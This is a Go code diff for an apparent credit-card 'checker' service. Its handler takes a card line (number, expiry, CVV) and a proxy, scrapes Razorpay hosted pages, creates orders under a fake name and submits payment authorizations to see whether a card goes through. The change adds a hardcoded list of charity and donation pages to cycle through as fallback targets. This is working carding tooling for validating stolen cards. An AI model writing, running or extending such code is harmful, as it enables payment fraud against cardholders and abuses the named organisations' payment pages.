@@ -56,10 +56,24 @@ func checkHandler(w http.ResponseWriter, r *http.Request) {
 	proxyURL := r.URL.Query().Get("proxy")
 	amountStr := r.URL.Query().Get("amount")
 
-	if ccLine == "" || siteURL == "" {
+	defaultSites := []string{
+		"https://pages.razorpay.com/satgurucharity",
+		"https://pages.razorpay.com/agape",
+		"https://pages.razorpay.com/epdonation",
+		"https://pages.razorpay.com/saveourearth",
+		"https://pages.razorpay.com/exceldigital",
+		"https://pages.razorpay.com/pl_HB3M7WgxCaYkO2/view",
+	}
+
+	if ccLine == "" {
 		w.WriteHeader(http.StatusBadRequest)
-		_, _ = w.Write([]byte(`{"error":"Missing cc or site parameter"}`))
+		_, _ = w.Write([]byte(`{"error":"Missing cc parameter"}`))
 		return
+	}
+
+	sitesToTry := defaultSites
+	if siteURL != "" {
+		sitesToTry = []string{siteURL}
 	}
 
 	// Default custom amount (INR)
@@ -104,85 +118,75 @@ func checkHandler(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	session := &RazorpaySession{
-		Client:       client,
-		ProxyURL:     proxyURL,
-		PageURL:      siteURL,
-		CustomAmount: customAmount,
-	}
+	var finalResp APIResponse
+	var lastErr string
 
-	// Step 1: Scrape hosted page config
-	if err := session.ScrapePage(); err != nil {
-		resp := APIResponse{
+	for _, currentSite := range sitesToTry {
+		session := &RazorpaySession{
+			Client:       client,
+			ProxyURL:     proxyURL,
+			PageURL:      currentSite,
+			CustomAmount: customAmount,
+		}
+
+		if err := session.ScrapePage(); err != nil {
+			lastErr = fmt.Sprintf("Scrape failed on %s: %v", currentSite, err)
+			continue
+		}
+
+		orderID, err := session.CreateOrder("Jane Doe", "janedoe@example.com", "9876543210")
+		if err != nil {
+			lastErr = fmt.Sprintf("Order creation failed on %s: %v", currentSite, err)
+			continue
+		}
+
+		result, err := session.SubmitPayment(cardNo, expMonth, expYear, cvv, "Jane Doe", "janedoe@example.com", "+919876543210", orderID)
+		if err != nil {
+			lastErr = fmt.Sprintf("Payment submission error on %s: %v", currentSite, err)
+			continue
+		}
+
+		if result.Status == "SiteError" && len(sitesToTry) > 1 {
+			lastErr = fmt.Sprintf("Site error on %s: %s", currentSite, result.Message)
+			continue
+		}
+
+		status := "false"
+		switch result.Status {
+		case "success", "3ds":
+			status = "true"
+		case "SiteError":
+			status = "SiteError"
+		}
+
+		finalResp = APIResponse{
 			CC:       ccLine,
 			Gateway:  "Razorpay Pages",
-			Response: "NO_PRODUCT_FOUND",
-			Status:   "false",
-			Message:  fmt.Sprintf("Failed to extract page config: %v", err),
+			Response: result.Response,
+			Price:    formatAmount(session.ItemAmount),
+			Currency: session.Currency,
+			Status:   status,
+			Message:  result.Message,
 			Time:     fmt.Sprintf("%.2fs", time.Since(startTime).Seconds()),
 			Proxy:    getProxyLabel(proxyURL),
 		}
-		jsonResp, _ := json.Marshal(resp)
+
+		jsonResp, _ := json.Marshal(finalResp)
 		_, _ = w.Write(jsonResp)
 		return
 	}
 
-	// Step 2: Create Order ID
-	orderID, err := session.CreateOrder("Jane Doe", "janedoe@example.com", "9876543210")
-	if err != nil {
-		resp := APIResponse{
-			CC:       ccLine,
-			Gateway:  "Razorpay Pages",
-			Response: "ORDER_FAILED",
-			Status:   "false",
-			Message:  fmt.Sprintf("Failed to create order: %v", err),
-			Time:     fmt.Sprintf("%.2fs", time.Since(startTime).Seconds()),
-			Proxy:    getProxyLabel(proxyURL),
-		}
-		jsonResp, _ := json.Marshal(resp)
-		_, _ = w.Write(jsonResp)
-		return
-	}
-
-	// Step 3: Submit Payment Authorization
-	result, err := session.SubmitPayment(cardNo, expMonth, expYear, cvv, "Jane Doe", "janedoe@example.com", "+919876543210", orderID)
-	if err != nil {
-		resp := APIResponse{
-			CC:       ccLine,
-			Gateway:  "Razorpay Pages",
-			Response: "SUBMIT_FAILED",
-			Status:   "false",
-			Message:  fmt.Sprintf("Payment submission error: %v", err),
-			Time:     fmt.Sprintf("%.2fs", time.Since(startTime).Seconds()),
-			Proxy:    getProxyLabel(proxyURL),
-		}
-		jsonResp, _ := json.Marshal(resp)
-		_, _ = w.Write(jsonResp)
-		return
-	}
-
-	// Prepare API response
-	status := "false"
-	switch result.Status {
-	case "success", "3ds":
-		status = "true"
-	case "SiteError":
-		status = "SiteError"
-	}
-
-	resp := APIResponse{
+	// If all sites failed
+	finalResp = APIResponse{
 		CC:       ccLine,
 		Gateway:  "Razorpay Pages",
-		Response: result.Response,
-		Price:    formatAmount(session.ItemAmount),
-		Currency: session.Currency,
-		Status:   status,
-		Message:  result.Message,
+		Response: "SITE_ERROR",
+		Status:   "SiteError",
+		Message:  lastErr,
 		Time:     fmt.Sprintf("%.2fs", time.Since(startTime).Seconds()),
 		Proxy:    getProxyLabel(proxyURL),
 	}
-
-	jsonResp, _ := json.Marshal(resp)
+	jsonResp, _ := json.Marshal(finalResp)
 	_, _ = w.Write(jsonResp)
 }
 
